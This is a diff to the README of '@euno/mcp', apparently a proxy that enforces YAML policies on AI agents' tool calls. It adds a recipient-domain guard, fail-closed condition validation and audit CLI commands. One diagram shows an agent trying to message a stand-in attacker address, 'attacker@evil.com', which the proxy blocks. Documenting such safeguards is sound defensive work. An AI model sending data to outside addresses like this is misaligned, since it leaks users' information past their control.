@@ -36,6 +36,24 @@ One YAML file. No code changes to your agent or your server.
 
 ---
 
+**Second example — HTTP transport, recipient guard:**
+
+An agent connected over HTTP tries to send a Slack DM to an external address.
+The `recipientDomain` condition fires before the upstream is reached:
+
+```
+Agent  →  tools/call: send_message { to: "attacker@evil.com", text: "..." }
+                                     ↓
+                          @euno/mcp (HTTP): recipientDomain check fails
+                          upstream never called
+                                     ↓
+Agent  ←  CapabilityDenied: recipient domain not in allowlist
+```
+
+The same policy file works for both stdio and HTTP transports.
+
+---
+
 ## Drop-in usage
 
 ### stdio — Claude Desktop / Cursor / Windsurf
@@ -126,9 +144,12 @@ requiredCapabilities:
         windowSeconds: 60
 ```
 
-Supported condition types: `maxCalls`, `timeWindow`, `allowedOperations`,
-`allowedExtensions`, `allowedTables`, `ipRange`, `recipientDomain`, `policy`,
+Supported condition types: `maxCalls`, `timeWindow`, `allowedOperations`, `allowedExtensions`,
+`allowedTables`, `ipRange`, `recipientDomain`, `redactFields`, `policy`, `custom`,
 plus the `argumentSchema` field on each constraint.
+
+See [`docs/policy-backends.md`](./docs/policy-backends.md) for the `policy` backend interface
+and [`docs/custom-conditions.md`](./docs/custom-conditions.md) for the `custom` handler contract.
 
 ---
 
@@ -207,6 +228,16 @@ The guarantee is: "the agent sent this tool call with these arguments, and it wa
 allowed/denied by this policy." It is not a guarantee about what the upstream server did
 internally. For the strongest guarantees, instrument the upstream as well.
 
+### Schema parity — one shape, zero drift
+
+The policy file `@euno/mcp` consumes is a **literal subset** of `AgentCapabilityManifest`
+from `@euno/common-core` (Apache-2.0). `@euno/mcp` imports types from `@euno/common-core` and
+never defines its own condition or constraint types.
+
+**Unknown condition types are denied** at two points — at policy-validation time (`euno-mcp validate`)
+and at enforcement time (the PDP). Both layers refuse unknown types, so a typo in a condition type
+name is a **fail-closed error**, not a silent pass-through.
+
 ### `allowedOperations` — first-word extraction, not SQL parsing
 
 The `allowedOperations` condition extracts the **first whitespace-delimited token** from
@@ -276,7 +307,12 @@ On timeout the proxy returns a structured `CapabilityDenied` result with
 | `euno-mcp proxy --auth-token <token>` | Require Bearer token auth on /mcp (HTTP transport) |
 | `euno-mcp proxy --upstream-timeout <ms>` | Timeout for upstream tool calls |
 | `euno-mcp proxy --policy-backend <module>` | Load a policy backend module (repeatable) |
+| `euno-mcp proxy --custom-condition <module>` | Load a custom condition handler module (repeatable) |
+| `euno-mcp proxy --trust-forwarded-for` | Trust `X-Forwarded-For` for `ipRange` (HTTP transport, loopback bind only) |
 | `euno-mcp validate <policy-file>` | Validate a policy file — exits 0 on success |
+| `euno-mcp validate-token --request-id <id>` | Look up an audit record by request ID and verify its HMAC signature |
+| `euno-mcp validate-token --since <ISO>` | Scan the audit log from a timestamp and verify all records |
+| `euno-mcp stats [--since <ISO>] [--audit-log <path>]` | Print a denial-reason histogram from the local audit log |
 | `euno-mcp kill <sessionId\|all> [--port <n>]` | Activate the kill switch in a running HTTP proxy |
 | `euno-mcp --help` | Show all options |
 
